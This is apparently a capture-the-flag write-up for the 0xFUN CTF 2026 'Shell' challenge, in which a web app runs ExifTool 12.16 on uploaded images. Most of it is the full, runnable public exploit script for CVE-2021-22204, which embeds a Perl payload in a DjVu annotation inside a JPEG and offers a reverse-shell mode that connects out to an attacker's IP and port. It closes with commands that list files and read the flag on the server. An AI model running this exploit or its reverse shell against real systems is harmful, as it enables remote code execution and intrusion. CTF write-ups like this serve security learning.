---
title: "Shell - 0xFUN CTF 2026"
category: "stego"
subcategory: "metadata"
type: "writeup"
tags: ["stego", "exiftool", "exif", "base64", "subprocess", "reverse-shell", "metadata", "0xfun-ctf", "0xfun-ctf-2026", "2026", "ctf-writeup"]
summary: "![](https://axl0t0l.github.io/assets/img/logos/axl0t0l.png)"
source:
  name: "CTFtime writeup #40671"
  url: "https://ctftime.org/writeup/40671"
original_source: "https://axl0t0l.github.io/posts/0xFun/Shell"
ctf:
  name: "0xFUN CTF 2026"
  year: 2026
  challenge: "Shell"
---

## Metadata

- **CTF:** 0xFUN CTF 2026
- **Task:** Shell
- **Author team:** 0xDr460nZ
- **CTFtime:** <https://ctftime.org/writeup/40671>
- **Original writeup:** <https://axl0t0l.github.io/posts/0xFun/Shell>

---
Shell | 0xFun CTF 2026 __

Contents __

Shell | 0xFun CTF 2026

__

[![](https://axl0t0l.github.io/assets/img/logos/axl0t0l.png)](https://axl0t0l.github.io/assets/img/logos/axl0t0l.png)

##  Overview __

  * **Platform:** [0xFun](https://ctf.0xfun.org/)
  * **Challenge:** [Shell](https://ctf.0xfun.org/challenges#Shell-58)
  * **Categories:** Web
  * **Rating:** 8/10
  * **Difficulty:** Easy
  * **Sovling Time:** ~15 Minutes


## Challenge __

> “ _This simple web app lets you upload images to inspect their EXIF metadata. But something feels off… maybe your uploads are being examined more closely than you realize. Can you get the server to execute a command of your choosing and expose the hidden flag.txt file?_

> _Note: Only image uploads are allowed. No brute force needed — just the right approach and format._ ”

## Walkthrough __

### Recon __

If we inspect the website we find it has an upload button to upload files to inspect their metadata. lets look what it will output on test image:[![intersting details for later.....](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/website.png)](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/website.png)

###  Solution Approach __

> “ _Flag format:`0xfun{}`_”

From the previous recon we can see that it uses `Exiftool V12.16` thats a core piece of information. if we google for that version, we find this: [![](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/gemni.png)](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/gemni.png)

after some quick searching on google for `CVE-2021-22204` i found [this](https://github.com/UNICORDev/exploit-CVE-2021-22204)

#### The Script:__

____

`

```
    1
    2
    3
    4
    5
    6
    7
    8
    9
    10
    11
    12
    13
    14
    15
    16
    17
    18
    19
    20
    21
    22
    23
    24
    25
    26
    27
    28
    29
    30
    31
    32
    33
    34
    35
    36
    37
    38
    39
    40
    41
    42
    43
    44
    45
    46
    47
    48
    49
    50
    51
    52
    53
    54
    55
    56
    57
    58
    59
    60
    61
    62
    63
    64
    65
    66
    67
    68
    69
    70
    71
    72
    73
    74
    75
    76
    77
    78
    79
    80
    81
    82
    83
    84
    85
    86
    87
    88
    89
    90
    91
    92
    93
    94
    95
    96
    97
    98
    99
    100
    101
    102
    103
    104
    105
    106
    107
    108
    109
    110
    111
    112
    113
    114
    115
    116
    117
    118
    119
    120
    121
    122
    123
    124
    125
    126
    127
    128
    129
    130
    131
    132
    133
    134
    135
    136
    137
    138
    139
    140
    141
    142
    143
    144
    145
    146
    147
    148
    149
    150
    151
    152
    153
    154
    155
    156
    157
    158
    159
    160
    161
    162
    163
    164
    165
    166
    167
    168
    169
    170
    171
    172
    173
    174
    175
    176
    177
    178
    179
    180
    181
    182
    183
    184
    185
    186
    187
    188
    189
    190
    191
    192
    193
    194
    195
    196
    197
    198
```

| 

```
     #!/usr/bin/env python3
    # Exploit Title: ExifTool 7.44-12.23 - Arbitrary Code Execution
    # Date: 04/30/2022
    # Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
    # Vendor Homepage: https://exiftool.org/
    # Software Link: https://github.com/exiftool/exiftool/archive/refs/tags/12.23.zip
    # Version: 7.44-12.23
    # Tested on: ExifTool 12.23 (Debian)
    # CVE: CVE-2021-22204
    # Source: https://github.com/UNICORDev/exploit-CVE-2021-22204
    # Description: Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image
    
    # Imports
    import base64
    import os
    import subprocess
    import sys
    import time
    
    # Class for colors
    class color:
        red = '\033[91m'
        gold = '\033[93m'
        blue = '\033[36m'
        green = '\033[92m'
        no = '\033[0m'
    
    # Print UNICORD ASCII Art
    def UNICORD_ASCII():
        print(rf"""
    {color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
    {color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
    {color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
    {color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
        """)
    
    # Print exploit help menu
    def help():
        print(r"""UNICORD Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
    
    Usage:
      python3 exploit-CVE-2021-22204.py -c <command>
      python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
      python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
      python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
      python3 exploit-CVE-2021-22204.py -h
    
    Options:
      -c    Custom command mode. Provide command to execute.
      -s    Reverse shell mode. Provide local IP and port.
      -i    Path to custom JPEG image. (Optional)
      -h    Show this help menu.
    """)
    
    def loading(spins):
    
        def spinning_cursor():
            while True:
                for cursor in '|/-\\':
                    yield cursor
    
        spinner = spinning_cursor()
        for _ in range(spins):
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
            time.sleep(0.1)
            sys.stdout.write('\b')
    
    # Check for dependencies
    def dependencies():
    
        deps = {'bzz':"sudo apt install djvulibre-bin",'djvumake':"sudo apt install djvulibre-bin",'exiftool':"sudo apt install exiftool"}
        missingDep = False
    
        for dep in deps:
            if subprocess.call(['which',dep],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT) == 1:
                print(f"{color.blue}ERRORED: {color.red}Missing dependency \"{dep}\". Try: \"{deps[dep]}\"{color.no}")
                missingDep = True
    
        if missingDep is True:
            exit()
    
    # Run the exploit
    def exploit(command):
    
        UNICORD_ASCII()
    
        # Create perl payload
        payload = "(metadata \"\c${"
        payload += command
        payload += "};\")"
    
        print(f"{color.blue}UNICORD: {color.red}Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution{color.no}")
        print(f"{color.blue}PAYLOAD: {color.gold}" + payload + f"{color.no}")
        loading(15)
    
        # Check for dependencies
        dependencies()
    
        print(f"{color.blue}DEPENDS: {color.gold}Dependencies for exploit are met!{color.no}")
    
        loading(15)
    
        # Write payload to file
        payloadFile = open('payload','w')
        payloadFile.write(payload)
        payloadFile.close()
    
        print(f"{color.blue}PREPARE: {color.gold}Payload written to file!{color.no}")
    
        # Bzz compress file
        subprocess.run(['bzz', 'payload', 'payload.bzz'])
    
        print(f"{color.blue}PREPARE: {color.gold}Payload file compressed!{color.no}")
    
        # Run djvumake
        subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
    
        print(f"{color.blue}PREPARE: {color.gold}DjVu file created!{color.no}")
    
        # Process custom image file
        if '-i' in sys.argv:
            imagePath = sys.argv[sys.argv.index('-i') + 1]
            subprocess.run(['cp',f'{imagePath}','./image.jpg','-n'])
    
        else:
            # Smallest possible JPEG
            image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="
    
            # Write smallest possible JPEG image to file
            with open("image.jpg", "wb") as img:
                img.write(base64.decodebytes(image))
    
        print(f"{color.blue}PREPARE: {color.gold}JPEG image created/processed!{color.no}")
    
        # Write exiftool config to file
        config = (r"""
        %Image::ExifTool::UserDefined = (
        'Image::ExifTool::Exif::Main' => {
            0xc51b => {
                Name => 'HasselbladExif',
                Writable => 'string',
                WriteGroup => 'IFD0',
            },
        },
        );
        1; #end
        """)
        configFile = open('exiftool.config','w')
        configFile.write(config)
        configFile.close()
    
        print(f"{color.blue}PREPARE: {color.gold}Exiftool config written to file!{color.no}")
    
        loading(15)
    
        # Exiftool config for output image
        subprocess.run(['exiftool','-config','exiftool.config','-HasselbladExif<=exploit.djvu','image.jpg','-overwrite_original_in_place','-q'])
    
        print(f"{color.blue}EXPLOIT: {color.gold}Payload injected into image!{color.no}")
    
        # Delete leftover files
        os.remove("payload")
        os.remove("payload.bzz")
        os.remove("exploit.djvu")
        os.remove("exiftool.config")
        if os.path.exists("image.jpg_exiftool_tmp"):
            os.remove("image.jpg_exiftool_tmp")
    
        print(f"{color.blue}CLEANUP: {color.gold}Old file artifacts deleted!{color.no}")
    
        loading(15)
    
        # Print results
        print(f"{color.blue}SUCCESS: {color.green}Exploit image written to \"{color.gold}image.jpg{color.green}\"{color.no}\n")
    
        exit()
    
    if __name__ == "__main__":
    
        args = ['-h','-c','-s','-i']
    
        if args[0] in sys.argv:
            help()
    
        elif args[1] in sys.argv and not args[2] in sys.argv:
            exec = sys.argv[sys.argv.index(args[1]) + 1]
            command = f"system(\'{exec}\')"
            exploit(command)
    
        elif args[2] in sys.argv and not args[1] in sys.argv:
            localIP = sys.argv[sys.argv.index(args[2]) + 1]
            localPort = sys.argv[sys.argv.index(args[2]) + 2]
            command = f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({localPort},inet_aton('{localIP}'))));"
            exploit(command)
    
        else:
            help()
```  
  
---|---  
`

#### Exploitation __

as in the above script we can generate an image with the exploit payload with the following command:

____

`

```
    1
```

| 

```
    python3 exploit-CVE-2021-22204.py -c "command"
```  
  
---|---  
`

In this case lets try

____

`

```
    1
```

| 

```
    python3 exploit-CVE-2021-22204.py -c "ls -la; pwd"
```  
  
---|---  
`

[![](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/exploit-working.png)](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/exploit-working.png)

now lets try

____

`

```
    1
```

| 

```
    python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"
```  
  
---|---  
`

[![](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/flag.png)](https://axl0t0l.github.io/assets/img/posts/2026-02-14-Shell/flag.png)

#### Flag __

`0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}`

**_Hope you enjoined the writeup, Don’t forget to leave a comment or a star on the[github repo](https://github.com/Axl0t0l) (;_**

__[0xFun CTF 2026](https://axl0t0l.github.io/categories/0xfun-ctf-2026/), [WarmUp](https://axl0t0l.github.io/categories/warmup/)

__[Web](https://axl0t0l.github.io/tags/web/) [Exploit](https://axl0t0l.github.io/tags/exploit/)

This post is licensed under [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) by the author.

Share [ __](https://twitter.com/intent/tweet?text=Shell%20%7C%200xFun%20CTF%202026%20-%20Axl0t0l&url=https%3A%2F%2Faxl0t0l.github.io%2Fposts%2F0xFun%2FShell "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?title=Shell%20%7C%200xFun%20CTF%202026%20-%20Axl0t0l&u=https%3A%2F%2Faxl0t0l.github.io%2Fposts%2F0xFun%2FShell "Facebook") [ __](https://t.me/share/url?url=https%3A%2F%2Faxl0t0l.github.io%2Fposts%2F0xFun%2FShell&text=Shell%20%7C%200xFun%20CTF%202026%20-%20Axl0t0l "Telegram") __
